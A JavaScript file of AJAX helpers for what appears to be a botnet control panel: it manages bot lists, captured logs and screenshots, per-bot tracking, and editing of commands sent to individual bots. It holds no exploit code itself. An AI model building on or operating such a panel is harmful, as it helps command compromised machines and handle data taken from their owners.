function delete_logs(type, pref, file){
	if(file != null){
		if(confirm(lang['delys']+file+'?'))
		get_hax({
			url:'/logs/delete-'+type+'.html?str='+pref+'&file='+file,
			/*id:'del_'+file,*/
			method:'get'

		});
	}else{
		if(confirm(lang['deidpsvf'] + ': ' +pref))
		get_hax({
			url:'/logs/delete-'+type+'.html?str='+pref,
			/*id:'del_'+file,*/
			method:'get'

		});
	}
	return false;
}

function add_search(){
	get_hax({
		url:'/logs/search.html?ajax=1',
		method:'post',
		form:'search_fg',
	});
}

function get_result_window(id){
	get_window('/logs/result-'+id+'.html?window=1', {name:'result'+id, widht: 800, height: 600});
	return false;
}

function get_bot_window(id){
	get_window('/bots/bot-'+id+'.html?window=1', {name:'bot'+id, widht: 800, height: 600});
	return false;
}

function start_search(){
	get_hax({
		url:'/logs/search.html?ajax=1&type=1',
		method:'get',
	});
}

function check_date(obj){
	if(obj.checked == true){
		obj.style.display = 'none';
		document.getElementById('date_search_set').innerHTML = '';
	}else{
		obj.checked = true;
	}
}

function search_lp(obj){
	get_hax({
		url: obj.href,
		id: obj.parentNode.parentNode.id,
		method:'get',
	});

	return false;
}

function bots_list (url) {
	get_hax({
			url: url + '&ajax=1',
			method: 'get',
			id: 'content',
	});
	return false;
}

function get_scr_window(id){
	get_window('/logs/screens-'+id+'.html?window=1', {name:'screen'+id, widht: 800, height: 600});
	return false;
}

function delete_screen(id, content){
	if(confirm(lang['deidds']))
	get_hax({
		url:'/logs/screens-'+id+'.html?window=1',
		method:'get',
		id: content + '_content',
	});
	return false;
}

function add_filter(){
	get_hax({
		url:'/logs/filters.html?ajax=1',
		method:'post',
		form:'search_fg',
	});
}

function start_filters(){
	get_hax({
		url:'/logs/filters.html?ajax=1&type=1',
		method:'get',
	});
}

function set_tracking(id, content){
	get_hax({
			url: '/bots/tracking-'+id+'.html?ajax=1&str='+content,
			method: 'get',
			id: content,
			indicator: '<div align="center"><img src="/images/loading.gif" alt="'+lang['load']+'" /></div>',
	});
	return false;
}

function save_bot_cmd_b(uniq){
	if(checklen(document.forms['form'+uniq].elements['cmd'+uniq], 250) != false){
		get_hax({
			url: '/bots/jobs_bot_edit-'+uniq+'.html?ajax=1',
			method: 'post',
			params: 'cmd=' + document.forms['form'+uniq].elements['cmd'+uniq].value,
			id: 'cmdcell' + uniq,
			indicator: '<form action="#" name="form'+uniq+'"><div align="center"><img src="/images/loading.gif" alt="'+lang['load']+'" /></div></form>',
		});
	}
	return false;
}

function edit_comment_b(td, form_name){
	//var id = td.id.replace('cg_', '');
	var id=td.id.split('_');
	if(!comment[id[1] + '' + id[2]]){
		var text = td.innerHTML;
		text = text.replace(/<br>/g, '\n');
		text = text.replace(/<\/?[^>]+>/g, '');
		td.innerHTML = '<textarea name="text_'+id[1] + '_' + id[2]+'" cols="1" rows="1" style="width:99%; height: 60px;" onBlur="save_comment_b(this, '+form_name+');">'+text+'</textarea>';
    	document.forms[form_name].elements['text_' + id[1] + '_' + id[2]].focus();
		comment[id] = true;
    }
}

function save_bot_cmd(uniq){
	if(checklen(document.forms['form'+uniq].elements['cmd'+uniq], 250) != false){
		get_hax({
			url: '/bots/jobs_bot_edit-'+eval('id_bot_'+uniq)+'.html?ajax=1',
			method: 'post',
			params: 'cmd=' + document.forms['form'+uniq].elements['cmd'+uniq].value,
			id: 'cmdcell' + uniq,
			indicator: '<form action="#" name="form'+uniq+'"><div align="center"><img src="/images/loading.gif" alt="'+lang['load']+'" /></div></form>',
		});
	}
	return false;
}

function edit_bot_cmd_b(obj, uniq){
	if(!document.forms['form'+uniq]){
		myf=document.createElement("form");
		myf.name = 'form'+uniq;
		myf.action = '#';
		
		myt = document.createElement("textarea");
		myt.name = 'cmd'+uniq;
		myt.style.width = '100%';
		myt.value = obj.cells[1].textContent;
		
		myi = document.createElement("input");
		myi.type = 'button';
		myi.value = lang['save'];
		myi.onclick = new Function("e", "save_bot_cmd_b('"+uniq+"');");
		
		myf.appendChild(myt);
		myf.appendChild(myi);
		
		obj.cells[1].innerHTML = '';
		obj.cells[1].appendChild(myf);
		
		//obj.cells[1].innerHTML = '<form action="#" name="form'+uniq+'"><textarea name="cmd'+uniq+'" style="width:100%;" onBlur="save_bot_cmd_b('+uniq+');">'+obj.cells[1].textContent+'</textarea><br /><input type="button" value="'+lang['save']+'" onclick="save_bot_cmd_b('+uniq+');" /></form>';
	}
	return false;
}

function edit_bot_cmd(obj, uniq){
	if(!document.forms['form'+uniq]){
		myf=document.createElement("form");
		myf.name = 'form'+uniq;
		myf.action = '#';
		
		myt = document.createElement("textarea");
		myt.name = 'cmd'+uniq;
		myt.style.width = '100%';
		myt.value = obj.cells[1].textContent;
		
		myi = document.createElement("input");
		myi.type = 'button';
		myi.value = lang['save'];
		myi.onclick = new Function("e", "save_bot_cmd('"+uniq+"');");
		
		myf.appendChild(myt);
		myf.appendChild(myi);
		
		obj.cells[1].innerHTML = '';
		obj.cells[1].appendChild(myf);
				
		//obj.cells[1].innerHTML = '<form action="#" name="form'+uniq+'"><textarea name="cmd'+uniq+'" style="width:100%;">'+obj.cells[1].textContent+'</textarea><br /><input type="button" value="'+lang['save']+'" onclick="save_bot_cmd('+uniq+');" /></form>';
	}
	return false;
}

function date_load (url) {
	var matches = url.match(/str=([0-9]{8})/g);
	var data = matches[0].replace('str=', '');
	get_hax({
		url: url + '&ajax=1',
		method: 'get',
		id: 'd' + data,
	});
	return false;
}

function uniqid(){
	var newDate = new Date;
	return newDate.getTime();
}



function gbw (bot, date, obj) {
	obj.id = uniqid();
	obj.onclick = null;
	get_hax({
		url: '/logs/show-'+date+'.html?str=' + bot + '&ajax=1',
		method: 'get',
		id: obj.id,
	});
	return false;
}

function get_sl_window(id){
	get_window('/logs/screen-'+id+'.html?window=1', {name:'screen'+id, widht: 800, height: 600});
	return false;
}

